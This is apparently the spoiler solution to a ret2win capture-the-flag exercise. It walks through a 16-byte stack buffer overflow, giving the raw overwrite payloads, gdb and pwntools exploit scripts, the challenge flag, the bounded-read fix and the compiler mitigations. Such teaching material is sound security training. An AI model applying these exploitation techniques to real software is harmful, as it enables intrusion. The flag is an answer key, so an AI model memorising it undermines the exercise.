# Binary Exploitation: ret2win, Solution

> ⚠️ **Spoilers below.** The offset, the payload, the flag, and the fix. If you
> want to solve it yourself, close this file and work from the downloaded binary.

## The vulnerability

`critical.c` reads attacker input onto a 16-byte stack buffer but asks for far
more bytes than the buffer holds:

```c
void vuln(void)
{
    char buf[16];
    read(0, buf, 0x40);   // reads up to 64 bytes into a 16-byte buffer
}
```

On x86-64 the stack frame of `vuln()` looks like this (low address at the top,
the direction `read` writes):

```
offset  0 ┌──────────────────────────┐ char buf[16]
          │  your bytes start here    │
offset 16 ├──────────────────────────┤ saved RBP        (8 bytes)
offset 24 ├──────────────────────────┤ saved return addr(8 bytes)  ← the target
          └──────────────────────────┘
```

Whatever 8 bytes you place at **offset 24** become the address the CPU jumps to
when `vuln()` returns. (The optional debug view visualises this with a live stack
table, but you do not need it to solve the challenge; everything below works from
the downloaded binary alone.)

## Walkthrough

### a) Crash it

Send a growing input until the program segfaults. It reads your bytes onto a small
stack buffer and then returns; once your input runs past that buffer and the saved
frame pointer into the saved return address, `vuln()` returns into garbage and you
get a **Segmentation fault**. The smallest crashing input tells you roughly how far
the return address sits from the start of your buffer.

### b) The buffer size

Work out how much room the input actually has. In the source (and in the binary)
the buffer is `char buf[16]` and the read is `read(0, buf, 0x40)`: 16 bytes of room,
but up to 64 read in. Ghidra's decompiler or `objdump` show it statically too, `buf`
sits at `rbp-0x10` (16 bytes below the saved frame pointer).

### c) win()'s address

Get `win()`'s address from the binary, not by running it: `nm ret2win | grep
' win$'`, `objdump`, or Ghidra's symbol tree. In the build shipped here it is around
`0x401176` (read the current value, it is build-specific), and the binary is
`-no-pie`, so it is fixed on every run.

### d) Return into `win()`

Now combine the two. The saved return address sits at offset **24** = 16 (`buf`) +
8 (saved RBP), so the payload is 24 bytes of padding, then `win()`'s address
little-endian. In the **hex** field (with `win = 0x401176`):

```
4141414141414141414141414141414141414141414141417611400000000000
```

or type it in the escape field as:

```
AAAAAAAAAAAAAAAAAAAAAAAA\x76\x11\x40\x00\x00\x00\x00\x00
```

Send it → `win()` runs. The binary itself only prints a decoy marker
(`N0tTh3Fl4gR34lly`), so the downloadable binary and the debug **Program** view
never contain the real flag; the web runner recognises the marker and reveals it:

- **Flag:** `R3turn2Th3W1n`

(Bytes like `0x40`, `0x00` are why this needs the raw byte fields, not a normal
text input, the address contains non-printable bytes, and `read` has no delimiter
so the NUL bytes pass straight through.)

### e) The fix

Bound the read to the buffer's real size, so input can never run past `buf`:

```c
void vuln(void)
{
    char buf[16];
    read(0, buf, sizeof buf);   // 16 bytes into a 16-byte buffer, no overflow
}
```

**Save** (the binary recompiles), then resend the payload: it now reads only 16
bytes, `vuln()` returns normally, and there is no flag. **Restore Original** brings
the bug back.

### f) The other lane, compiler protections (no source change)

Open the Fix editor's **compiler-flags** field and try each, checking `checksec` on
the rebuilt binary and re-running the exploit:

- **Stack canary** (`-fstack-protector-all`): a secret value is placed between
  `buf` and the saved return address and checked on return. Your overflow smashes
  it, so the program **aborts** (`*** stack smashing detected ***`, signal 6)
  before it ever returns, the exploit is stopped. **Defeats ret2win.**
- **PIE + ASLR** (`-fpie -pie`): the binary is loaded at a random base each run, so
  `win()`'s address is no longer the fixed `0x401176` you hard-coded, your payload
  jumps to the wrong place. **Defeats this exploit** (until you add an info leak to
  recover the base, a later rung). Note: address randomization also needs the host
  kernel's ASLR on, which the container cannot force.
- **NX / non-executable stack** (on by default): this stops *shellcode on the
  stack*. It does **not** stop ret2win, because you are reusing code (`win()`) that
  is already in executable memory, no injected code required. Important lesson:
  NX is necessary but not sufficient.

### g) Defenses and their limits

- A **stack canary** catches contiguous stack-buffer overflows before return, but
  not overflows that skip the canary (e.g. index-based writes), and it can be
  defeated with a canary leak.
- **PIE + ASLR** hides addresses, but a single **info leak** recovers the base and
  re-enables everything.
- **NX** blocks code injection, but code *reuse* (ret2win, ret2libc, full ROP)
  sidesteps it entirely.
- The real fix is **not writing the overflow in the first place** (bound the read).
  Mitigations are defense in depth, not a substitute.

## Professional tools

Once you understand it by hand, this is the standard binary-exploitation toolkit.
None of it uses the challenge's debug view, you work from the downloaded binary.

**Ghidra**: open `ret2win`, let it auto-analyse, and read `vuln()` and `win()` as
decompiled C. The fastest way to see the buffer size, the offset, and `win()`'s
address without touching the running challenge.

**checksec**: see the protections at a glance:

```bash
checksec --file=./ret2win     # No canary, No PIE, NX enabled
```

**objdump / nm**: find the target:

```bash
nm ./ret2win | grep ' win'                 # win()'s address
objdump -d -M intel ./ret2win | less       # read vuln() and main()
```

**gdb** with **pwndbg** or **gef**: watch the overflow take over RIP:

```bash
gdb ./ret2win
pwndbg> run <<< $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*24+b"BBBBBBBB")')
# at the crash, pwndbg shows RIP = 0x4242424242424242, you own the instruction pointer
```

**pwntools**: script the whole thing (this is what task **h** asks for):

```python
from pwn import *

e = ELF('./ret2win')
# offset 24 found with a cyclic pattern:
#   p = process('./ret2win'); p.send(cyclic(200)); p.wait()
#   offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))   # -> 24
offset = 24

payload = b'A' * offset + p64(e.symbols['win'])   # e.symbols resolves win() for you
p = process('./ret2win')
p.send(payload)
print(p.recvall(timeout=1).decode())              # -> the decoy marker; send the
                                                  #    same payload to the web runner
                                                  #    to get the real flag
```

The lesson: the manual payload teaches you *why* it works; pwntools resolves the
symbol, builds the packed address, and runs it for you once you understand it.

The next rung, [ret2libc](../ret2libc/), keeps this exact overflow but the code you
want to run is no longer sitting in a convenient `win()`: you build it by chaining
addresses (`ROPgadget`, pwntools `ROP()`).
